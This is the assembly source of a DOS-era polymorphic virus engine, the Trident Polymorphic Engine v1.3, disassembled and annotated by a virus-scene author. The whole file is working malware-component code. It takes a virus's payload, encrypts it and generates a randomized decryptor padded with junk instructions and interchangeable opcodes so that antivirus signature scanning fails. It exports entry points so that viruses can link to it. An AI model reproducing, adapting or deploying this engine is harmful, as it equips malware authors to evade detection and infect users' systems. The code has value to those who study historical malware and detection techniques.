.radix 16

;=============================================================================
;                                                                            =
;                        Trident Polymorphic Engine v1.3                     =
;                        -------------------------------                     =
;                                                                            =
;            Dissassembled by: Lucifer Messiah -- ANARKICK SYSTEMS           =
;                                                                            =
;            This dissassembly uses as many of the labels from the           =
;            TPE v1.2 dissassembly as possible, to allow comparison          =
;                                                                            =
;----------------------------------------------------------------------------=
;                                                                            =
;       Trident Polymorphic Engine v1.3                                      =
;       -------------------------------                                      =
;                                                                            =
;       Input:                                                               =
;             ES        Work Segment                                         =
;             DS:DX     Code to be encrypted                                 =
;             BP        Becomes offset of TPE                                =
;             SI        Distance to put betwen decryptor and code            =
;             CX        Length of code to encrypt                            =
;             AX        Bit Field Flags:  bit 0: DS will not be equal to CS  =
;                                         bit 1: insert random instructions  =
;                                         bit 2: put junk before decryptor   =
;                                         bit 3: Preserve AX with decryptor  =
;                                                                            =
;       Output:                                                              =
;             ES        Work segment (preserved)                             =
;             DS:DX     Decryptor + encrypted code                           =
;             BP        Start of decryptor                                   =
;             DI        Length of decryuptor/offset of encrypted code        =
;             CX        Length of decryptor + encrypted code                 =
;             AX        Length of encrypted code                             =
;                                                                            =
;=============================================================================

.model tiny
.code

public          rnd_init
public          rnd_get
public          crypt
public          tpe_top
public          tpe_bottom


                org     100h

tpe_top         equ     $
                db      '[ MK / TridenT ]'      ;Encryptor name
crypt:
                push    ds                      ;save registers
                push    dx
                push    si
                push    cs
                pop     ds
                call    TPE_13

TPE_13:
                pop     si
                sub     si,offset TPE_13        ;get delta offset

                xor     di,di                   ;di=start of decryptor
                mov     byte ptr flags[si],al
                test    al,08
                je      no_push
                mov     al,50h
                stosb

no_push:
                call    rnd_get                 ;add a few bytes to cx
                and     ax,1fh
                add     cx,ax
                push    cx                      ;save length of code
                call    rnd_get                 ;get random flags
                xchg    ax,bx

;--- Flags: -----------------------------------------------
;
; 0,1   encryption method
; 2,3   which registers to use in encryption engine
; 4     use byte or word for encrypt
; 5     MOV AL, MOV AH, or MOV AX
; 6     MOV CL, MOV CH, or MOV CX
; 7     AX or DX
; 8     count up or down
; 9     ADD/SUB/INC/DEC or CMPSW/SCASW
; A     ADD/SUB or INC/DEC
;       CMPSW or SCASW
; B     offset in XOR instrucion?
; C     LOOPNZ or LOOP
;       SUB CX or DEC CX
; D     carry with crypt ADD/SUB
; E     carry with inc ADD/SUB
; F     XOR instruction value or AX/DX
;
;----------------------------------------------------------

random:
                call    rnd_not_0               ;get encryption value
                mov     word ptr xor_val[si],ax ;store it

                call    do_junk                 ;insert random instructions
                pop     cx
                mov     ax,0111h                ;make flags to remember which
                test    bl,20h                  ; MOV instructions are used
                jne     z0
                xor     al,07

z0:
                test    bl,0ch
                jne     z1
                xor     al,70h

z1:
                test    bl,40h
                jne     z2
                xor     ah,07

z2:
                test    bl,10h
                jne     z3
                and     al,73h

z3:
                test    bh,80h
                jne     z4
                and     al,70h

z4:
                mov     dx,ax

mov_lup:
                call    rnd_get                 ;put MOV instructions in a
                and     ax,000fh                ; random order
                cmp     al,0ah
                ja      mov_lup
                mov     word ptr store_mov[si],ax ; Why????
                push    cx                      ;test if MOV already done
                xchg    ax,cx
                mov     ax,0001h
                shl     ax,cl
                mov     cx,ax
                and     cx,dx
                pop     cx
                je      mov_lup
                xor     dx,ax                   ;remember which MOV done

                push    dx
                call    do_mov                  ;insert MOV instruction
                call    do_nop                  ;insert a random NOP
                pop     dx
                or      dx,dx                   ;all MOVs done?
                jne     mov_lup
                push    di                      ;save start of decryptor loop
                call    do_add_ax               ;add a value to AX in loop?
                call    do_nop
                test    bh,20h                  ;carry with ADD/SUB?
                je      no_clc
                mov     al,0f8h
                stosb

no_clc:
                mov     word ptr xor_offset[si],0000h
                call    do_xor                  ;place all loop instructions
                call    do_nop
                call    do_add
                pop     dx                      ;get start of decryptor loop
                call    do_loop
                test    byte ptr flags[si],08   ;insert POP AX??
                je      no_pop
                mov     al,58h
                stosb

no_pop:
                mov     ax,di                   ;calculate loop offset
                add     ax,bp
                pop     dx
                add     ax,dx
                sub     ax,word ptr xor_offset[si]
                push    di
                mov     di,word ptr where_len[si]
                test    bl,0ch                  ;are BL,BH used for encryption?
                jne     v2
                mov     byte ptr es:[di],al
                mov     di,word ptr where_len2[si]
                mov     byte ptr es:[di],ah
                jmp     short v3

v2:
                mov     word ptr es:[di],ax

v3:
                pop     di
                mov     dx,word ptr xor_val[si]
                mov     bp,word ptr add_val[si]
                pop     si                      ;ds:si=start of code
                pop     ds
                push    di                      ;save pointer to encrypted code
                push    cx                      ;save length of encrypted code
                test    bl,10h                  ;byte or word?
                je      blup
                inc     cx                      ;cx=# of crypts (words)
                shr     cx,1

lup:
                lodsw                           ;encrypt code (words)
                call    do_encrypt
                stosw
                loop    lup
                jmp     short klaar

blup:
                lodsb                           ;encrypt code (bytes)
                xor     dh,dh
                call    do_encrypt
                stosb
                loop    blup

klaar:
                mov     cx,di                   ;cx=length decryptor + code
                pop     ax                      ;ax=length of decrypted code
                pop     di                      ;offset encrypted code
                xor     dx,dx                   ;ds:dx=decryptor + cr. code
                push    es
                pop     ds
                retn
 
;--- Encrypt the Code -------------------------------------

do_encrypt:
                add     dx,bp
                test    bl,02
                jne     lup1
                xor     ax,dx
                retn

lup1:
                test    bl,01
                jne     lup2
                sub     ax,dx
                retn

lup2:
                add     ax,dx
                retn

;--- Generate MOV reg,xxxx --------------------------------

do_mov:
                mov     dx,word ptr mov_byte[si]
                push    bx
                mov     bx,dx
                mov     al,byte ptr mov_here[bx+si]

                pop     bx
                cmp     dl,04                   ; bx???
                jne     is_not_bx
                call    add_ind

is_not_bx:
                test    dl,0ch                  ; a*?
                pushf
                jne     is_not_a
                test    bl,80h                  ; a* or d*?
                je      is_not_a
                add     al,02

is_not_a:
                call    alter                   ; insert the MOV
                popf                            ; a*
                jne     is_not_a2
                mov     ax,word ptr xor_val[si]
                jmp     short sss

is_not_a2:
                test    dl,08                   ; b*?
                jne     is_not_b
                push    bx
                lea     bx,word ptr where_len[si]
                test    dl,02
                je      is_not_bh
                add     bx,02

is_not_bh:
                mov     word ptr [bx],di
                pop     bx
                jmp     short sss

is_not_b:
                mov     ax,cx                   ;c*?
                test    bl,10h                  ;byte or word encryption?
                je      sss
                inc     ax                      ;only half the number of bytes
                shr     ax,1

sss:
                test    dl,03                   ;byte or word register?
                je      is_x
                test    dl,02                   ;*h?
                je      is_not_h
                xchg    ah,al

is_not_h:
                stosb
                retn

is_x:
                stosw
                retn

;--- Insert MOV or alternative for MOV --------------------

alter:
                push    bx
                push    cx
                push    ax
                call    rnd_get
                xchg    ax,bx
                pop     ax
                test    bl,03                   ;use alternative for MOV?
                je      no_alter

                push    ax
                and     bx,0fh
                and     al,08
                shl     ax,1
                or      bx,ax
                pop     ax

                and     al,07
                mov     cl,09
                xchg    ax,cx
                mul     cl

                add     ax,30c0h
                xchg    ah,al
                test    bl,04
                je      no_sub
                mov     al,28h
no_sub:         call    maybe_2
                stosw

                mov     al,80h
                call    maybe_2
                stosb

                xchg    ax,bx
                and     ax,0003h
                lea     bx,word ptr alt_code[si]
                xlat                            ;AL = DS:[BX+AL]
                add     al,cl

no_alter:       stosb
                pop     cx
                pop     bx
                retn

;--- Insert ADD AX,XXXX -----------------------------------
 
do_add_ax:
                push    cx
                mov     word ptr add_val[si],0  ;save ADD value here

                mov     ax,bx
                and     ax,8110h
                xor     ax,8010h
                jne     no_add_ax               ;use ADD?

                mov     ax,bx
                xor     ah,ah
                mov     cl,03
                div     cl
                or      ah,ah
                jne     no_add_ax               ;use ADD?

                test    bl,80h
                jne     do_81C2                 ;AX or DX?
                mov     al,05
                stosb
                jmp     short do_add0

do_81C2:        mov     ax,0c281h
                stosw

do_add0:        call    rnd_get
                mov     word ptr add_val[si],ax
                stosw

no_add_ax:      pop     cx
                retn

;--- generate encryption command --------------------------

do_xor:
                test    byte ptr flags[si],01
                je      no_cs
                mov     al,2eh                  ;insert CS: instruction
                stosb

no_cs:          test    bh,80h                  ;type of XOR command
                je      xor1
                call    get_xor
                call    do_carry
                call    save_it
                xor     ax,ax
                test    bl,80h
                je      xxxx
                add     al,10h

xxxx:
                call    add_dir
                test    bh,08
                jne     yyyy
                stosb
                retn
 
yyyy:           or      al,80h
                stosb
                call    rnd_get
                stosw
                mov     word ptr xor_offset[si],ax
                retn

xor1:           mov     al,80h                  ;encrypt with value
                call    save_it
                call    get_xor
                call    do_carry
                call    xxxx
                mov     ax,word ptr xor_val[si]
                test    bl,10h
                jmp     byte_word
 
;--- generate increase/decrease command -------------------

do_add:
                test    bl,08                   ;no CMPSW/SCASW if BX is used
                je      da0
                test    bh,02                   ;ADD/SUB/INC/DEC or CMPSW/SCASW
                jne     do_cmpsw


da0:            test    bh,04                   ;ADD/SUB or INC/DEC?
                je      add1
                mov     al,40h                  ;INC/DEC

add0:
                call    add_ind
                stosb
                test    bl,10h                  ;byte or word?
                je      return
                stosb                           ;same instruction again

return:         retn

add1:           test    bh,40h                  ;ADD/SUB
                je      no_clc2                 ;carry??
                mov     al,0f8h                 ;insert CLC
                stosb

no_clc2:        mov     al,83h
                stosb
                mov     al,0c0h
                test    bh,40h
                je      add2
                and     al,0cfh
                or      al,10h

add2:           call    add_ind
                stosb
                mov     al,01
 
save_it:
                call    add_1
                stosb
                retn

do_cmpsw:       test    bh,04                   ;CMPSW or SCASW
                je      normal_cmpsw
                test    bl,04                   ;no SCASW if SI is used
                jne     do_scasw

normal_cmpsw:   mov     al,0a6h
                jmp     short save_it

do_scasw:       mov     al,0aeh
                jmp     short save_it

;--- generate LOOP command --------------------------------

do_loop:
                test    bh,01                   ;no JNE if counting down
                jne     cx_loop
                mov     al,0e0h                 ;LOOPNZ or LOOP?
                test    bh,1ah                  ; no LOOPNZ if xor-offset
                je      l10                     ; no LOOPNZ if CMP/SCASW
                add     al,02

l10:            stosb
                mov     ax,dx
                sub     ax,di
                dec     ax
                stosb
                retn

cx_loop:        test    bh,10h                  ;SUB CX or DEC CX??
                jne     cxl_dec
                mov     al,83h
                stosb
                call    rnd_get
                test    al,01
                jne     b062c9
                mov     ax,01e9h
                jmp     short asdfasdf          

b062c9:         mov     ax,0ffc1h

asdfasdf:       stosw
                jmp     short do_jne

cxl_dec:        mov     al,49h
                stosb

do_jne:         call    rnd_get
                test    al,01
                mov     al,7fh
                jne     l10
                mov     al,75h
                jmp     short l10
 
;--- add value to AL depending on register type -----------

add_dir:
                push    di
                lea     di,word ptr dir_change[si]
                jmp     short xx1

add_ind:
                push    di
                lea     di,word ptr ind_change[si]

xx1:            push    bx
                shr     bl,1
                shr     bl,1
                and     bx,03
                add     al,byte ptr [bx+di]
                pop     bx
                pop     di
                retn

;--- mov encryption command byte to AL --------------------

get_xor:
                push    bx
                xchg    ax,bx
                and     ax,0003h
                lea     bx,word ptr how_mode[si]
                xlat
                pop     bx
                retn

;--- change ADD to ADC ------------------------------------
 
do_carry:
                test    bl,02                   ;ADD/SUB used for encryption?
                je      no_ac
                test    bh,20h
                je      no_ac
                and     al,0cfh
                or      al,10h

no_ac:          retn
 
;--- change AL (byte/word) --------------------------------

add_1:
                test    bl,10h
                je      add_1_ret
                inc     al

add_1_ret:      retn
 
;--- change AL (byte/word) --------------------------------

maybe_2:
                call    add_1                   ;can't touch this
                cmp     al,81h
                je      maybe_not
                push    ax
                call    rnd_get
                test    al,01
                pop     ax
                je      maybe_not
                add     al,02

maybe_not:      retn

;--- insert random instructions ---------------------------

do_junk:
                test    byte ptr flags[si],04
                je      no_junk
                call    rnd_get                 ;put a random number of
                and     ax,000fh                ; dummy instructions before
                inc     ax                      ; decryptor
                xchg    ax,cx
junk_loop:      call    junk
                loop    junk_loop

no_junk:         retn
 
;--- Insert random nop (or not) ---------------------------

do_nop:
                test    byte ptr flags[si],02

yes_nop:        je      no_nop
                call    rnd_get
                test    al,03
                je      nop8
                test    al,02
                je      nop16
                test    al,01
                je      nop16x

no_nop:         retn
 
;--- get rough random nop (may affect register values -----

junk:
                call    rnd_get
                and     ax,001eh
                jmp     short aa0

nop16x:         call    rnd_get
                and     ax,0006h

aa0:            push    bx
                xchg    ax,bx
                call    rnd_get
                mov     bx,word ptr junk_cals[bx+si]
                add     bx,si
                call    bx
                pop     bx
                retn

;--- NOP and junk addresses -------------------------------

junk_cals:
                dw      offset nop16x0
                dw      offset nop16x1
                dw      offset nop16x2
                dw      offset nop16x3
                dw      offset nop8
                dw      offset nop16
                dw      offset junk6
                dw      offset junk7
                dw      offset junk8
                dw      offset junk9
                dw      offset junkA
                dw      offset junkB
                dw      offset junkC
                dw      offset junkD
                dw      offset junkE
                dw      offset junkF

;--- NOP and junk routines --------------------------------

nop16x0:
                add     byte ptr [si],cl        ; J* 0000 (conditional)
                jo      yes_nop                 ; Jump on Overflow
                retn

nop16x1:
                mov     al,0ebh                 ; JMP xxxx / junk
                and     ah,07
                inc     ah
                stosw
                xchg    ah,al                   ;get length of bullshit
                cbw                             ;convrt AL to AX
                jmp     fill_bullshit

nop16x2:
                call    junkD                   ; XCHG AX,reg /XCHG AX,reg
                stosb
                retn

nop16x3:
                call    junkF                   ; INC/DEC or DEC/INC
                xor     al,08
                stosb
                retn

nop8:
                push    bx
                and     al,07
                lea     bx,word ptr nop_data8[si]
                xlat                            ; AL = DS:[BX+AL]
                stosb
                pop     bx
                retn

nop16:          push    bx
                and     ax,0303h
                lea     bx,word ptr nop_data16[si]
                xlat                            ; AL = DS:[BX+AL]
                add     al,ah
                stosb
                call    rnd_get
                and     al,07
                mov     bl,09
                mul     bl
                add     al,0c0h
                stosb
                pop     bx
                retn

junk6:
                push    cx
                mov     al,0e8h                 ;CALL xxxx / junk / POP reg
                and     ah,0fh
                inc     ah
                stosw
                xor     al,al
                stosb
                xchg    ah,al
                call    fill_bullshit
                call    do_nop
                call    rnd_get                 ;insert POP reg
                and     al,07
                call    no_sp
                mov     cx,ax
                or      al,58h
                stosb

                test    ch,03                   ;more?
                jne     junk6_ret
                call    do_nop
                mov     ax,0f087h               ; insert XCHG SI,reg
                or      ah,cl
                test    ch,08
                je      j6_1
                mov     al,8bh

j6_1:           stosw
                call    do_nop
                call    rnd_get
                xchg    ax,bx
                and     bx,0f7fbh               ;insert XOR [SI],xxxx
                or      bl,08
                call    do_xor

junk6_ret:      pop     cx
                retn
 
junk7:
                and     al,0fh                  ;MOV reg,xxxx
                or      al,0b0h
                call    no_sp
                stosb
                test    al,08
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junk8:
                and     ah,39h                  ;DO r/m,r(8,16)
                or      al,0c0h
                call    no_sp
                xchg    ah,al
                stosw
                retn
 
junk9:
                and     al,3bh                  ;DO r(8/16),r/m
                or      al,02
                and     ah,3fh
                test    al,01
                je      junk9_ret
                or      ah,0c0h

junk9_ret:      call    no_sp2
                call    no_bp
                stosw
                retn

junkA:
                and     ah,01                   ;DO rm,xxxx
                or      ax,80c0h
                call    no_sp
                xchg    ah,al
                stosw
                test    al,01
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junkB:
                call    nop8                    ;NOP/LOOP
                mov     ax,0fde2h
                stosw
                retn

junkC:
                and     al,09                   ;CMPS* or SCAS*
                test    ah,01
                je      mov_test
                or      al,0a6h
                and     al,0feh
                stosb
                retn

mov_test:       or      al,0a0h                 ;MOV AX,[xxxx] or TEST AX,xxxx
                stosb
                cmp     al,0a8h
                pushf
                call    rnd_not_0
                dec     ax
                popf
                jmp     short byte_word

junkD:
                and     al,07                   ; XCHG AX,reg
                or      al,90h
                call    no_sp
                stosb
                retn


junkE:
                and     ax,0307h
                or      ax,5850h
                stosw
                retn
 
junkF:
                and     al,0fh                  ; INC/DEC
                or      al,40h
                call    no_sp
                stosb
                retn

;--- store a byte or a word -------------------------------
 
byte_word:      je      only_byte
                stosw
                retn

only_byte:      stosb
                retn
 
;--- don't fuck with sp -----------------------------------

no_sp:
                push    ax
                and     al,07
                cmp     al,04
                pop     ax
                jne     no_sp_ret
                and     al,0fbh

no_sp_ret:      retn
 
;--- don't fuck with sp -----------------------------------

no_sp2:
                push    ax
                and     ah,38h
                cmp     ah,20h
                pop     ax
                jne     no_sp2_ret
                xor     ah,20h
 
no_sp2_ret:     retn

;--- don't use [bp+..] ------------------------------------
 
no_bp:
                test    ah,04
                jne     no_bp2
                and     ah,0fdh
                retn

no_bp2:         push    ax
                and     ah,07
                cmp     ah,06
                pop     ax
                jne     no_bp_ret
                or      ah,01

no_bp_ret:      retn
 
;--- write byte for JMP/CALL and fill with random bullshit

fill_bullshit:
                push    cx
                xchg    ax,cx

bull_lup:       call    rnd_get
                stosb
                loop    bull_lup
                pop     cx
                retn

;--- random number generator ------------------------------
 
rnd_init:
                push    ax
                push    cx
                call    rnd_init0
                and     ax,000fh
                inc     ax
                xchg    ax,cx

random_lup:     call    rnd_get                 ;call random routine a few
                loop    random_lup              ; times to 'warm up'

                pop     cx
                pop     ax
                retn
 
rnd_init0:
                push    dx                      ;initialize generator
                push    cx
                mov     ah,2ch
                int     21h                     ; get time CH,CL:DH,DL
                in      al,40h                  ; timer
                mov     ah,al
                in      al,40h                  ; timer

                xor     ax,cx
                xor     dx,ax
                jmp     short move_rnd
 
rnd_not_0:
                call    rnd_get
                or      ax,ax
                je      rnd_not_0
                retn
 
rnd_get:
                push    dx                      ;calculate random number
                push    cx
                push    bx
                in      al,40h                  ;timer
                add     ax,0000h                ;ERROR: should be MOV ax,0
                mov     dx,0000h
                mov     cx,0007h

rnd_lup:        shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_12
                inc     al

rnd_12:         loop    rnd_lup
                pop     bx

move_rnd:       push    si
                call    mov_rnd2

mov_rnd2:
                pop     si
                mov     word ptr cs:[si-1Bh],ax ;  [si-(rnd_get+4)]
                mov     word ptr cs:[si-18h],dx ;  [si-(rnd_get+7)]
                pop     si
                mov     al,dl
                pop     cx
                pop     dx
                retn

;--- TABLES FOR ENGINE ------------------------------------

mov_byte:       db      0b8,0b0,0b4,00          ;AX,AL,AH,..
                db      0b8,0b3,0b7,00          ;BX,BL,BH,..
                db      0b9,0b1,0b5             ;CX,CL,CH

nop_data8       db      90,0f8,0f9,0f5          ;NOP,CLC,STC,CMC
                db      0fa,0fc,45,4dh          ;CLI,CLD,INC BP,DEC BP

nop_data16      db      8,20,84,88              ;OR,AND,XCHG,MOV

dir_change      db      7,7,4,5                 ;BL/BH,BX,SI,DI

ind_change      db      3,3,6,7                 ;BL/BH,BX,SI,DI

how_mode        db      30,30,0,28              ;XOR,XOR,ADD,SUB

alt_code        dw      0c0f0, 0c800            ;????, ADD AL,CL

add_val         dw      00
xor_val         dw      00
xor_offset      dw      00
where_len       dw      00
where_len2      dw      00
store_mov       dw      00
mov_here        =       $-1
flags           db      00

ID_Bytes        db      '[TPE 1.3]'
tpe_bottom      equ     $

                end     crypt
 
